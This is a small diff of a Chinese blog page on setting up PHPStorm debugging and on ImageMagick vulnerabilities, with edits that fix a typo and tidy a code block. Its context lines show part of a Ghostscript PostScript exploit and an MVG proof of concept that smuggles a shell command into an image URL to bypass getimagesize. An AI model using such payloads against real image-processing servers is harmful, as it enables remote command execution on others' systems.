@@ -24,7 +24,7 @@
 <li><p>重启apache服务</p>
 </li>
 </ol>
-<h2 id="phpstorm配置"><a href="#phpstorm配置" class="headerlink" title="phpstorm配置"></a>phpstorm配置</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>每步配置完成后言点击右下角：<code>Apply</code>！！！</p>
+<h2 id="phpstorm配置"><a href="#phpstorm配置" class="headerlink" title="phpstorm配置"></a>phpstorm配置</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>每步配置完成后需点击右下角：<code>Apply</code>！！！</p>
 <h3 id="php解释器配置"><a href="#php解释器配置" class="headerlink" title="php解释器配置"></a>php解释器配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP</p>
 <p>php版本7.3.4。其他的正常配置解释器即可。</p>
 <h3 id="debug配置"><a href="#debug配置" class="headerlink" title="debug配置"></a>debug配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug</p>
@@ -230,7 +230,7 @@ errordict /typecheck {
 (All done.)=
 
 quit
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="code"><pre><span class="line">## 绕过getimagesize，执行new ImageMagick()漏洞</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">  - ###  mvg格式的POC ：</span></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">## 绕过getimagesize，执行new ImageMagick()漏洞</span></pre></td></tr><tr><td class="code"><pre><span class="line">  - ###  mvg格式的POC ：</span></pre></td></tr></table></figure>
 push graphic-context
 viewbox 0 0 640 480
 fill &apos;url(https://127.0.0.0/oops.jpg&quot;|&quot;`id`)&apos;
